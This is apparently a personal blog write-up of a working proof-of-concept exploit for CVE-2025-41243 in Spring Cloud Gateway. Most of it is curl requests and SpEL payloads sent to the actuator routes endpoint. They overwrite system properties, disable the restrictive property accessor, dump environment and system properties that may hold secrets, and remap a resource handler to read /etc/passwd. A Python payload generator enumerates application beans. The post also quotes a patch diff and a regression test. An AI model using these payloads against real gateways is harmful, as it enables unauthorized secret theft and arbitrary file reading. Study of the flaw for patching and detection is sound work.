[CVE-2025-41243: Spring Expression Language property modification using Spring Cloud Gateway Server WebFlux](https://spring.io/security/cve-2025-41243) is out and got CVSS score 10.0.

Here is my, hmmm.... is it really a complete Proof of Concept? Because I would expect that CVSS score 10.0 includes a RCE as well.<br>
I'm nothing, I have to learn a lot.

Patch delta shows in restrictive mode, that no assignments are allowed anymore<br>
org/springframework/cloud/gateway/support/ShortcutConfigurable.java:
```
		public GatewayEvaluationContext(BeanFactory beanFactory) {
			this.beanFactoryResolver = new BeanFactoryResolver(beanFactory);
			Environment env = beanFactory.getBean(Environment.class);
			boolean restrictive = env.getProperty("spring.cloud.gateway.restrictive-property-accessor.enabled",
					Boolean.class, true);
			if (restrictive) {
				delegate = SimpleEvaluationContext.forPropertyAccessors(new RestrictivePropertyAccessor())
						.withMethodResolvers((context, targetObject, name, argumentTypes) -> null)
            .withAssignmentDisabled()     // <---- newly added
            .build();
			}
			else {
				delegate = SimpleEvaluationContext.forReadOnlyDataBinding().build();
			}
```

And a test case was added to check that assignments are not possible anymore<br>
org/springframework/cloud/gateway/support/ShortcutConfigurableTests.javaâ€Ž
```
	public void testNormalizeDefaultTypeWithSpelAssignmentAndInvalidInputFails() {
		parser = new SpelExpressionParser();
		ShortcutConfigurable shortcutConfigurable = new ShortcutConfigurable() {
			@Override
			public List<String> shortcutFieldOrder() {
				return Arrays.asList("bean", "arg1");
			}
		};
		Map<String, String> args = new HashMap<>();
		args.put("bean", "#{ @myMap['my.flag'] = true}");      // <---- has to fail
		args.put("arg1", "val1");
		assertThatThrownBy(() -> {
			ShortcutType.DEFAULT.normalize(args, shortcutConfigurable, parser, this.beanFactory);
		}).isInstanceOf(SpelEvaluationException.class);
	}
```


## Creating new route with property assignment and reading it
```
curl -X POST -H 'Content-Type: application/json' -i http://gateway:8092/actuator/gateway/routes/route-spel-assign --data '{
  "id": "route-spel-assign",
  "uri": "http://1.2.3.4:8443/",
  "predicates": [
    {
      "name": "Path",
      "args": {
        "pattern": "/spel-assign"
      }
    }
  ],
  "filters": [
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "X-SpEL-SystemProperty-Set1",
        "value": "#{@systemProperties['\''my.own.flag'\''] = '\''directly set'\''}"
      }
    },
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "X-SpEL-SystemProperty-Get1",
        "value": "#{@systemProperties['\''my.own.flag'\'']}"
      }
    },
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "X-SpEL-SystemProperty-Set2",
        "value": "#{@systemProperties['\''my.own.flag'\''] = '\''taken from java home:'\'' + @systemProperties['\''java.home'\'']}"
      }
    },
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "X-SpEL-SystemProperty-Get2",
        "value": "#{@systemProperties['\''my.own.flag'\'']}"
      }
    }
  ]
}'
```

## Apply new route
```
curl -X POST -i http://gateway:8092/actuator/gateway/refresh
```

## Getting data of newly added route
```
http://gateway:8092/actuator/gateway/routes/route-spel-assign

{"predicate":"Paths: [/spel-assign], match trailing slash: true",
"route_id":"route-spel-assign",
"filters":[
      "[[AddResponseHeader X-SpEL-SystemProperty-Set1 = 'directly set'], order = 1]",
      "[[AddResponseHeader X-SpEL-SystemProperty-Get1 = 'directly set'], order = 2]",
      "[[AddResponseHeader X-SpEL-SystemProperty-Set2 = 'taken from java home:/usr/lib/jvm/java-17-openjdk-17.0.16.0.8-2.el8.x86_64'], order = 3]",
      "[[AddResponseHeader X-SpEL-SystemProperty-Get2 = 'taken from java home:/usr/lib/jvm/java-17-openjdk-17.0.16.0.8-2.el8.x86_64'], order = 4]"
   ],
"uri":"http://1.2.3.4:8443/",
"order":0}
```

As you can see, the property assigment works and it's reading.<br>
```
"value": "#{@systemProperties['my.own.flag'] = 'taken from java home:' + @systemProperties['java.home']}"
"value": "#{@systemProperties['my.own.flag']}"
```
OK!<br>
I can read application specific `-DjavaProperties` values as well, which might contains some secrets (I will not mention).<br>

## But unpatched Spring already blocks Type and Method calls or does not support that.
```
"value": "#{@systemProperties['my.own.flag'] = T(java.lang.System).getProperty('java.version')}"
"value": "#{@systemProperties['my.own.flag'] = T(java.lang.String).valueOf(123)}"
"value": "#{@systemProperties['my.own.flag'] = T(java.lang.Runtime).getRuntime().exec('id')}"
"value": "#{@systemProperties['my.own.flag'] = ''.valueOf(123)}"
"value": "#{@systemProperties['my.own.flag'] = new String('acb')}"
```

## And now? Give me a light why this is a CVSS score of 10.0!

A post is out on X by [@GobySec](https://x.com/GobySec/status/1970757633444630710) showing a screenshot with a payload.<br>
But for me it does not work......   because the interessting part is not shown in picture

## Got a ping by original reseacher ezzer as reply to my post on X
ezzer gave me the link to his write up. It's better than my post ;-) [ezzer's writeup for CVE-2025-41243](https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln)<br>
Ahhhhh!!!! I wasn't that far away.<br>
Without using Property Assignment spring.cloud.gateway.restrictive-property-accessor.enabled = false we would get errors in followup calls like
```
SpelEvaluationException: EL1008E: Property or field 'key' cannot be found on object of type 'java.util.concurrent.ConcurrentHashMap$MapEntry' - maybe not public or not valid?
SpelEvaluationException: EL1008E: Property or field 'getPropertySources' cannot be found on object of type 'org.springframework.boot.web.reactive.context.ApplicationReactiveWebEnvironment' - maybe not public or not valid?
```

Based on ezzer's PoC where restrictive flag is set to false first, now I can read all environment and systemProperties at once
```
curl -X POST -H 'X-CSRF-TOKEN: true' -H 'Content-Type: application/json' -i http://gateway:9192/actuator/gateway/routes/route-spel-readdata --data '{
  "id": "route-spel-readdata",
  "uri": "http://1.2.3.4:8443/",
  "predicates": [{
    "name": "Path",
    "args": {
      "pattern": "/malicious"
    }
  }],
  "filters": [{
    "name": "AddRequestHeader",
    "args": {
      "name": "X-SpEL-get-environment",
      "value": "#{@environment.getPropertySources.?[#this.name matches '\''.*optional:classpath:.*'\''][0].source.![{#this.getKey, #this.getValue.toString}]}"
    }
  },
  {
    "name": "AddRequestHeader",
    "args": {
      "name": "X-SpEL-get-systemProperties",
      "value": "#{@systemProperties.![{#this.key, #this.value.toString}]}"
    }
  }
]
}'
```

## Apply new route
```
curl -X POST -i http://gateway:8092/actuator/gateway/refresh
```

## Read the new route and have fun
```
curl -i http://gateway:8092/actuator/gateway/routes/route-spel-readdata
```

That's enough for me. Still no RCE, but with property modification based on all visible environment and systemProperties keys, there will be some sign.<br>

## It's Never Simple Until It Is - Now with Remote File Inclusion
Another PoC was out, can be found here [https://rce.moe/2025/09/29/CVE-2025-41243](https://rce.moe/2025/09/29/CVE-2025-41243)<br>
This is much more fun, as we can read the files from server.<br>

Set route context with restrictive flag False
```
#{@systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = 'false'}
```

Refresh routes by POST `/actuator/gateway/refresh`

Set urlMap locationValues with FILE handler
```
#{@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///'}"
```
Refresh routes by POST `/actuator/gateway/refresh`

Set urlMap afterPropertiesSet (which will get some error in logs, but never mind)
```
#{@resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}"
```

Refresh routes by POST `/actuator/gateway/refresh`

Read /etc/passwd
```
curl -i http://gateway:8080/webjars/etc/passwd
```

## Last chapter - find all beans
I figured out, on my own, how to get all known beans from application.<br>
If restrictive flag is set False, and assuming we have 300 beans in the application, we can use this python payload generator to retrive them all
{% raw %}
```liquid
import json

filters = []

for i in range(299):
        spel_bean_value = f"{{@resourceHandlerMapping.applicationContext.beanDefinitionNames[{i}] ?: 'n.a.'}}"
        filters.append({
            "name": "AddResponseHeader",
            "args": {
                "name": f"X-Bean-{str(i).zfill(2)}",
                "value": spel_bean_value
            }
        })


route_payload = {
    "id": "spel-recon-route",
    "uri": "http://example.org",
    "predicates": [
        {
            "name": "Path",
            "args": {
                "pattern": "/spel-recon"
            }
        }
    ],
    "filters": filters
}

print(json.dumps(route_payload, indent=1))
```
{% endraw %}

Response will like
```
"filters":[
"[[AddResponseHeader X-Bean-00 = 'org.springframework.context.annotation.internalConfigurationAnnotationProcessor'], order = 1]",
"[[AddResponseHeader X-Bean-01 = 'org.springframework.context.annotation.internalAutowiredAnnotationProcessor'], order = 2]",
"[[AddResponseHeader X-Bean-01 = 'org.springframework.context.annotation.internalCommonAnnotationProcessor'], order = 3]",
"[[AddResponseHeader X-Bean-01 = 'org.springframework.context.event.internalEventListenerProcessor'], order = 4]"
.....
]
```



Thank you for reading. The CVE is not my credit, but the work on the PoC exploit was only for my private fun to learn about dynamic route definitions and mostly for my frustration to get a PoC. ;-)
